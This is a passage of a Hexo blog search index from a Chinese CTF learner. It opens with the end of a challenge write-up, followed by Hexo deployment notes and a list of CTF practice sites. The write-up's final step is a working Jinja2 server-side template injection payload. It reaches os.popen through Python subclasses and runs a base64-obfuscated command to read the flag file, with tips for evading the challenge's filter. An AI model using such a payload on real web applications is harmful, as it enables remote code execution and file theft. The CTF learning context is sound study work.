&#x2F;f*”&#x3D;&#x3D;”Y2F0IC9mKg&#x3D;&#x3D;”</p>{{''.__class__.__bases__[0].__subclasses__()[213].__init__.__globals__['__builtins__']['__import__']('os').popen('`echo Y2F0IC9mKg== | base64 -d`').read()}}<img src="/2023/04/02/problem1/problem111.jpg" srcset="/img/loading.gif" lazyload><p>成功拿到flag。</p><p>注意要包一层反引号（命令执行），不然会被当做字符串echo出来。</p><p>另外这道题刚开始的源码那块对”f”和”ge”进行了处理，我不知道在其他思路里会不会卡住，我试了下可以在语句的最后直接加上”ge”绕过。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SSTI</title>
    <link href="/2023/03/27/SSTI/"/>
    <url>/2023/03/27/SSTI/</url>
    
    <content type="html"><![CDATA[<p>本文记录自己SSTI的学习过程（本人为CTF菜鸡，如有错误还请指正）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/01/20/No%20Title!Just%20a%20picture!%F0%9F%98%9B/"/>
    <url>/2023/01/20/No%20Title!Just%20a%20picture!%F0%9F%98%9B/</url>
    
    <content type="html"><![CDATA[<img src="/2023/01/20/No%20Title!Just%20a%20picture!%F0%9F%98%9B/pic1.jpg" srcset="/img/loading.gif" lazyload>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>博客搭建(主要是怕自己忘记咋弄了)</title>
    <link href="/2023/01/20/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA(%E4%B8%BB%E8%A6%81%E6%98%AF%E6%80%95%E8%87%AA%E5%B7%B1%E5%BF%98%E8%AE%B0%E5%92%8B%E5%BC%84%E4%BA%86)/"/>
    <url>/2023/01/20/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA(%E4%B8%BB%E8%A6%81%E6%98%AF%E6%80%95%E8%87%AA%E5%B7%B1%E5%BF%98%E8%AE%B0%E5%92%8B%E5%BC%84%E4%BA%86)/</url>
    
    <content type="html"><![CDATA[<p>网站本地启动</p><p>cd hexo-blog</p><p>hexo g </p><p>hexo server</p><p>博客hexo根目录在D:&#x2F;blog</p><p>先修改完博文内容</p><p>👇更新本地hexo配置</p><p>先hexo g</p><p>再hexo d</p><p>配置完后准备发布到GitHub👇</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">hexo clean<br>hexo generate<br>(若要本地预览就先执行 hexo server)<br>hexo deploy<br></code></pre></td></tr></table></figure><p>git config –global http.sslVerify “true”</p><p>👆个人解决方案</p><p>按照网上的false并不能使用，更改为true后惊讶地发现可以使用</p><p>另外还要到设置中修改域名（每次博客更新都需要修改域名，每次更新设置的域名都会重置）</p><p>参考文章：</p><p><a href="https://www.jianshu.com/p/23b9e095c7c9">为你的hexo博客配置个性域名 - 简书 (jianshu.com)</a></p><p><a href="https://blog.csdn.net/ten_sory/article/details/81359421?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1-81359421-blog-120295287.pc_relevant_multi_platform_whitelistv2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1-81359421-blog-120295287.pc_relevant_multi_platform_whitelistv2&utm_relevant_index=2">(8条消息) Hexo+github博客搭建与自定义域名_梦想总是要不可及，是不是应该放弃的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/bbsyi/article/details/119101852">(8条消息) GitHub Pages + Hexo搭建个人博客网站，史上最全教程_弹琴弹琴的博客-CSDN博客_githubpages hexo</a></p><p><a href="https://hexo.fluid-dev.com/docs/guide/">https://hexo.fluid-dev.com/docs/guide/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>主要是怕自己忘记咋弄了,只记录了一些自己可能忘了的东西</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF网站收录</title>
    <link href="/2022/07/03/Welcome-to-my-blog/"/>
    <url>/2022/07/03/Welcome-to-my-blog/</url>
    
    <content type="html"><![CDATA[<p>比较系统的学习路线：<br><a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a><br>刷题网站：<br><a href="https://buuoj.cn/">https://buuoj.cn/</a><br><a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a><br><a href="https://www.ctfhub.com/#/index">https://www.ctfhub.com/#/index</a><br><a href="https://ctf.show/">https://ctf.show/</a><br><a href="http://www.zxsctf.com/">http://www.zxsctf.com/</a><br><a href="https://pwnable.tw/">https://pwnable.tw/</a>(pwn)<br><a href="https://microcorruption.com/">https://microcorruption.com/</a>(iot&amp;&amp;reverse&amp;&amp;pwn)<br>比赛资讯：<br><a href="https://www.ctfhub.com/#/calendar">https://www.ctfhub.com/#/calendar</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>用sticky置顶了哦</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Welcome to Ec0y&#39;s Blog</title>
    <link href="/2022/07/03/Blog/"/>
    <url>/2022/07/03/Blog/</url>
    
    <content type="html"><![CDATA[<img src="/2022/07/03/Blog/bg2.jpg" srcset="/img/loading.gif" lazyload class title="This is an example image">]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
